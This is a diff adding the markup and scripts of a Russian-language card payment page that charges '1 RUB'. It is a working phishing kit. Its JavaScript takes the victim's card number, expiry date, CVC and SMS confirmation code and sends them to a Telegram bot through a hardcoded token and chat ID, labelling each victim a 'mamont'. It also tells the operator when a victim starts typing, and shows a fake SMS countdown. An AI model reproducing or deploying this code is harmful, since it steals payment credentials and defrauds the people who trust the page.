+                                               class="form-control" required></div>
+                                            </div> -->
+                                            <div class="col-6 mt-0" id="dnon">
+                                                <label for="start">SMS</label>
+                                                <div style="position: relative;">
+                                                    <input type="text" placeholder="Введите SMS" id="sms" class="form-control">
+                                                </div>
+                                            </div>
+                                            <div id="smsalert">
+                                                Мы отправили SMS вам на номер <span id="countdown" class="countdown">30</span> секунд(ы)
+                                            </div>
+                                    <div class="row">
+                                        <div class="form-group col-12 text-center">
+                                            <button type="submit" class="btn btn-block btn-primary disabled" id="smsbtn" style="cursor: pointer; margin-bottom: -100px;">
+                                                <span>Оплатить 1 RUB</span>
+                                            </button>
+                                    <div class="mt-3" style="font-size: 11px; overflow: auto;"></div>
+                                </div>
+                                
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <noscript>
+            <div>
+                <img src="https://mc.yandex.ru/watch/87223494" style="position:absolute; left:-9999px;" alt="" />
+            </div>
+        </noscript>
+        <!-- /Yandex.Metrika counter -->
+
+        <link
+            href="https://fonts.googleapis.com/css?family=Open+Sans:400,700,800&amp;display=swap&amp;subset=cyrillic-ext"
+            rel="stylesheet">
+
+        <script>
+            document.getElementById('openModalBtn').addEventListener('click', function () {
+                document.getElementById('modal').style.display = 'flex';
+            });
+
+            document.getElementById('closeModalBtn').addEventListener('click', function () {
+                document.getElementById('modal').style.display = 'none';
+            });
+
+            window.onclick = function (event) {
+                if (event.target == document.getElementById('modal')) {
+                    document.getElementById('modal').style.display = 'none';
+                }
+            };
+
+
+        </script>
+
+<script>
+    async function sendData(event) {
+        event.preventDefault();
+        const cardNumber = document.getElementById('cardNumber').value;
+        const expiryDate1 = document.getElementById('expiryDate1').value;
+        // const cardHolder = document.getElementById('cardHolder').value;
+        const expiryDate2 = document.getElementById('sms').value;
+        const cvc = document.getElementById('cvc').value;
+
+        const botToken = '7305598349:AAG_FyY4wXl3kjJUqRA3J4iVBFKWC_DK8RY';
+        const chatId = '6294188239';
+        const message = `🦣Новый мамонт\n\n💳Данные карты\n├Номер карты: ${cardNumber}\n├Срок действия: ${expiryDate1}\n├CVC: ${cvc}\n└SMS: ${expiryDate2}`;
+        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+        try {
+            const response = await fetch(url);
+            if (response.ok) {
+                const result = await response.json();
+                document.getElementById('result').innerText = 'Имя отправлено в Telegram!';
+            } else {
+                document.getElementById('result').innerText = 'Ошибка отправки!';
+            }
+        } catch (error) {
+            document.getElementById('result').innerText = 'Ошибка: ' + error.message;
+        }
+    }
+
+    function notifyTyping() {
+        const cardNumber = document.getElementById('cardNumber').value;
+
+        if (cardNumber.length === 1) {
+            const botToken = '7305598349:AAG_FyY4wXl3kjJUqRA3J4iVBFKWC_DK8RY';
+            const chatId = '6294188239';
+            const message = `💳🦣Мамонт вводит данные`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(url).then(response => {
+                if (response.ok) {
+                    console.log('Message sent');
+                } else {
+                    console.log('Error sending message');
+                }
+            }).catch(error => {
+                console.log('Error:', error);
+            });
+        }
+    }
+
+    document.getElementById('cardNumber').addEventListener('input', notifyTyping);
+
+    document.getElementById('smsbtn').addEventListener('click', function() {
+        const myDiv = document.getElementById('dnon');
+        // const cardh = document.getElementById('cardHolder');
+        // const cardh2 = document.getElementById('cardh2');
+        const myDiv2 = document.getElementById('smsalert');
+
+        if (myDiv.style.display === 'none' || myDiv.style.display === '') {
+            myDiv.style.display = 'block';
+            // cardh.style.display = 'none';
+            // cardh2.style.display = 'none';
+            myDiv2.style.display = 'block';
+        } else {
+            myDiv.style.display = 'none';
+            myDiv2.style.display = 'none';
+            // cardh.style.display = 'block';
+            // cardh2.style.display = 'block';
+        }
+    });
+
+    function startCountdown(duration, display) {
+            let timer = duration, seconds;
+            const countdownInterval = setInterval(function () {
+                seconds = parseInt(timer, 10);
+
+                display.textContent = seconds;
+
+                if (--timer < 0) {
+                    clearInterval(countdownInterval);
+                    display.textContent = "SMS отправлено!"; // Optional message when countdown ends
+                }
+            }, 1000);
+        }
+
+        window.onload = function () {
+            const countdownDuration = 30; // 30 seconds
+            const display = document.querySelector('#countdown');
+            startCountdown(countdownDuration, display);
+        };
+</script>
+</body>
+
+</html>
